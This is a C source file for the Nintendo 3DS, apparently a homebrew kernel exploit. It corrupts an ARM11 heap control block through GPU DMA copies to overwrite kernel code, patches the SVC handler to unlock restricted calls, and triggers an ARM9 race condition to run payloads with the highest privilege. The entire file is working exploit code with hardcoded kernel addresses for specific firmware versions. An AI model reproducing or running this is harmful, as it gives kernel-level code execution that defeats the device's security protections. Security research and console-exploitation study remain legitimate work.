#include <3ds.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <malloc.h>
#include <dirent.h>


u32 nop_slide[0x1000] __attribute__((aligned(0x1000)));

u32 va_patch_createthread;
u32 va_patch_svc_handler;
u32 va_patch_hook1;
u32 va_patch_hook2;
u32 va_fcram_base;
u32 va_exc_handler_base_W;
u32 va_exc_handler_base_X;
u32 pa_exc_handler_base;
u32 offs_exc_handler_unused;
u32 offs_fcram_arm9_payload;
u32 va_kernelsetstate;

struct arm11_shared_data {
	u32 va_pdn_regs;
	u32 va_pxi_regs;
	u32 va_hook1_ret;
	u8 *va_framebuf;
} sd;

u8 is_healed_svc_handler = 0;
u32 kversion;
u8 isN3DS = 0;
u32 *backup;
u32 *arm11_buffer;

#define wait() svcSleepThread(1000000000ull)


int __attribute__((naked))
svcCorrCreateThread (int (*func)(void))
{
	asm volatile ("svc 8\t\n"
			 "bx lr\t\n");
}

int __attribute__((naked))
svcBackdoor(int (*func)(u32, u32, u32, u32))
{
	asm volatile ("svc #0x7B\t\n"
			 "bx lr\t\n");
}

// ldr pc, [pc, -#04]
#define JUMPOUT 0xE51FF004
void redirect_codeflow(void *from, void *to)
{
	*(u32 *)from = JUMPOUT;
	*(u32 *)(from + 4) = to;
}


int do_gshax_copy(void *dst, void *src, unsigned int len)
{
	unsigned int check_mem = linearMemAlign(0x10000, 0x40);
	int i = 0;

	// Sometimes I don't know the actual value to check (when copying from unknown memory)
	// so instead of using check_mem/check_off, just loop "enough" times.
	for (i = 0; i < 16; ++i) {
		GSPGPU_FlushDataCache (NULL, src, len);
		GX_SetTextureCopy(NULL, src, 0, dst, 0, len, 8);
		GSPGPU_FlushDataCache (NULL, check_mem, 16);
		GX_SetTextureCopy(NULL, src, 0, check_mem, 0, 0x40, 8);
	}

	linearFree(check_mem);

	return 0;
}

int heap0_get_diff()
{
	u32 *linmem = linearMemAlign(0x10000, 0x10000);
	
	u32 buf1, buf2, dmy;
	u32 bkp1[8], bkp2[8];
	int i;

	// alloc 2 bufs	
	svcControlMemory(&buf1, 0, 0, 0x2000, MEMOP_ALLOC_LINEAR, 0x3);
	svcControlMemory(&buf2, buf1+0x2000, 0, 0x2000, MEMOP_ALLOC_LINEAR, 0x3);	

	// free 2nd and bkp heap struct
	svcControlMemory(&dmy, buf2, 0, 0x2000, MEMOP_FREE, 0);
	do_gshax_copy(linmem, buf2, sizeof(bkp2));
	memcpy(&bkp2, linmem, sizeof(bkp2));
	
	// free 1st and bkp heap struct
	svcControlMemory(&dmy, buf1, 0, 0x2000, MEMOP_FREE, 0);
	do_gshax_copy(linmem, buf1, sizeof(bkp1));
	memcpy(&bkp1, linmem, sizeof(bkp1));
	
	linearFree(linmem);

	// diff
	/*
	for(i=0;i<sizeof(bkp1)/sizeof(u32);i++)
		printf("%02X: %08X - %08X\n", i, bkp2[i], bkp1[i]);
	*/
	return bkp1[0] - bkp2[0];
}
   
// TODO?: replace with osGetFirmVersion() and osGetKernelVersion()
u32 get_kernel_version()
{
	return *(u32 *)0x1FF80000; // KERNEL_VERSION register
}

/* Corrupts arm11 kernel code (CreateThread()) in order to
   open a door for arm11 code execution with kernel privileges.
*/
int corrupt_arm11_kernel_code(void)
{
	int i;
	int (*nop_func)(void);
	int *ipc_buf;
	int diff;
	u32 saved_heap[8];
		
	// TODO ;-)
	diff = heap0_get_diff();

	kversion = get_kernel_version();    
	
	APT_CheckNew3DS(NULL, &isN3DS);
	
	if (isN3DS)
	{
		if (kversion == 0x022C0600 || kversion == 0x022E0000)
		{
			va_patch_createthread = 0xDFF83837;
			va_patch_svc_handler = 0xDFF82260;
			va_patch_hook1 = 0xDFFE7A50;
			va_patch_hook2 = 0xDFFF4994;
			va_fcram_base = 0xE0000000;
			va_exc_handler_base_W = 0xDFFF4000;
			va_exc_handler_base_X = 0xFFFF0000;
			va_kernelsetstate = 0xFFF158F8;
			pa_exc_handler_base = 0x1FFF4000;
			offs_exc_handler_unused = 0xC80;
			offs_fcram_arm9_payload = 0x03F00000;

			sd.va_hook1_ret = 0xFFF28A58;
			sd.va_pdn_regs = 0xFFFBE000;
			sd.va_pxi_regs = 0xFFFC0000;
		}
		else
		{
			printf("Unsupported kernel version '%08X'\n", kversion);
			return 0;
		}
	}
	else
	{
		printf("Unsupported 3DS model\n");
		return 0;
	}
	printf("Loaded adr %x for kernel %x\n", va_patch_createthread, kversion); 

	// part 1: corrupt kernel memory
	u32 tmp_addr;
	unsigned int mem_hax_mem;
	
	svcControlMemory(&mem_hax_mem, 0, 0, 0x2000, MEMOP_ALLOC_LINEAR, 0x3);
	unsigned int mem_hax_mem_free = mem_hax_mem + 0x1000;

	printf("Freeing memory\n");
	svcControlMemory(&tmp_addr, mem_hax_mem_free, 0, 0x1000, MEMOP_FREE, 0); // free page 

	printf("Backing up heap area:\n");
	do_gshax_copy(arm11_buffer, mem_hax_mem_free, 0x20u);

	memcpy(saved_heap, arm11_buffer, sizeof(saved_heap));

	saved_heap[0] += diff;

	printf(" 0: %08X  4: %08X  8: %08X\n12: %08X 16: %08X 20: %08X\n",
			arm11_buffer[0], arm11_buffer[1], arm11_buffer[2],
			arm11_buffer[3], arm11_buffer[4], arm11_buffer[5]);			

	arm11_buffer[0] = 1;
	arm11_buffer[1] = va_patch_createthread - 8; // prev_free_blk at offs 8
	arm11_buffer[2] = 0;
	arm11_buffer[3] = 0;

	// overwrite free pointer
	printf("Overwriting free pointer %x\n", mem_hax_mem);
	wait();

	// corrupt heap ctrl structure
	do_gshax_copy(mem_hax_mem_free, arm11_buffer, 0x10u);
	
	// Trigger write to kernel. This will actually cause
	// the CreateThread() kernel code to be corrupted 
	svcControlMemory(&tmp_addr, mem_hax_mem, 0, 0x1000, MEMOP_FREE, 0);

	printf("Triggered kernel write\n");
	gfxFlushBuffers();
	gfxSwapBuffers();
    
	printf("Heap control block after corruption:\n");
	do_gshax_copy(arm11_buffer, mem_hax_mem_free, 0x20u);
	printf(" 0: %08X  4: %08X  8: %08X\n12: %08X 16: %08X 20: %08X\n",
			arm11_buffer[0], arm11_buffer[1], arm11_buffer[2],
			arm11_buffer[3], arm11_buffer[4], arm11_buffer[5]); 

	printf("Restoring heap\n");
	memcpy(arm11_buffer, saved_heap, sizeof(saved_heap));
	do_gshax_copy(mem_hax_mem, arm11_buffer, 0x20u);

	 // part 2: trick to clear icache
	for (i = 0; i < 0x1000; i++)
	{
		arm11_buffer[i] = 0xE1A00000; // ARM NOP instruction
	}
	arm11_buffer[i-1] = 0xE12FFF1E; // ARM BX LR instruction
	nop_func = nop_slide;

	do_gshax_copy(nop_slide, arm11_buffer, 0x10000);

	HB_FlushInvalidateCache();
	nop_func();

	printf("Exited nop slide\n");
	gfxFlushBuffers();
	gfxSwapBuffers();

	return 1;
}


void exploit_arm9_race_condition()
{
	u32 *src, *dst;
	extern u32 arm11_start[];
	extern u32 arm11_end[];
	extern u32 arm11_globals_start[];
	extern u32 arm11_globals_end[];
	extern u32 arm9_start[];
	extern u32 arm9_end[];

	int (* const _KernelSetState)(int, int, int, int) = (void *)va_kernelsetstate;
	
	asm volatile ("clrex");

	/* copy arm11 payload to lower, writable mirror of
	   mapped exception handlers*/
	dst = (u32 *)(va_exc_handler_base_W + offs_exc_handler_unused);
	for (src = arm11_start; src != arm11_end;) {
		*dst = *src;
		dst++;
		src++;		
	}

	/* copy firmware- and console specific data */
	dst = (u32 *)(va_exc_handler_base_W + 
	              offs_exc_handler_unused +
	              ((arm11_end-arm11_start)<<2));
	for (src = &sd; src != &sd + sizeof(sd) / sizeof(u32);) {
		*dst = *src;
		dst++;
		src++;		
	}

	/* copy arm9 payload to FCRAM */
	dst = (u32 *)(va_fcram_base + offs_fcram_arm9_payload);
	for(src = arm9_start; src != arm9_end;) {
		*dst = *src;
		dst++;
		src++;				
	}

	// patch arm11 kernel	 
	redirect_codeflow(va_patch_hook1,
	                  va_exc_handler_base_X +
	                  offs_exc_handler_unused);

	redirect_codeflow(va_patch_hook2,
	                  pa_exc_handler_base +
	                  offs_exc_handler_unused + 4);
	
	CleanEntireDataCache();
	InvalidateEntireInstructionCache();

	// trigger arm9 code execution
	_KernelSetState(0, 0, 2, 0);	
}

#define NOP 0xE320F000
apply_patches (bool heal_svc_handler)
{
	asm volatile ("clrex");
	
	CleanEntireDataCache();
	InvalidateEntireInstructionCache();	

	// repair CreateThread()
	*(int *)(va_patch_createthread) = 0x8DD00CE5;
			
	// heal svc handler (patch it to allow access to restricted SVCs) 
	if(heal_svc_handler && va_patch_svc_handler > 0)
	{
		*(int *)(va_patch_svc_handler) = NOP;
		*(int *)(va_patch_svc_handler+8) = NOP;
		is_healed_svc_handler = 1;
	}

	CleanEntireDataCache();
	InvalidateEntireInstructionCache();	

	return 0;
}

int __attribute__((naked))
launch_privileged_code (void)
{
	asm volatile ("add sp, sp, #8\t\n");
	apply_patches (false);
	exploit_arm9_race_condition();
	asm volatile ("movs r0, #0\t\n"
			 "ldr pc, [sp], #4\t\n");
}

#define RET 0xE12FFF1E // ARM BX LR instruction
#define NOP2 0xE1A00000

int run_exploit()
{
	int result = 0;
	int i;
	
	sd.va_framebuf = gfxGetFramebuffer(GFX_BOTTOM, GFX_LEFT, NULL, NULL); 
	int (*nop_func)(void);
	HB_ReprotectMemory(nop_slide, 4, 7, &result); 

	for (i = 0; i < 0x1000; i++)
	{
		nop_slide[i] = NOP2; // ARM NOP instruction
	}
	nop_slide[i-1] = RET; 
	nop_func = nop_slide;
	HB_FlushInvalidateCache();

	printf("Testing nop slide\n");
	nop_func();
	printf("Exited nop slide\n");

	arm11_buffer = linearMemAlign(0x10000, 0x10000);
	if (arm11_buffer)
	{
		// wipe memory for debugging purposes
		for (i = 0; i < 0x1000/sizeof(u32); i++)
		{
			arm11_buffer[i] = 0xdeadbeef;
		}
	
		if(corrupt_arm11_kernel_code ())
		{
			printf("Attempting to gain ARM9 code execution\n");
			wait();	
			svcCorrCreateThread (launch_privileged_code);			
			printf("Failure :[\n");
			if(is_healed_svc_handler)
			{
				// svc handler has been patched...
			}
		}
		linearFree(arm11_buffer);
		result = 1;
	}
	return result;
}
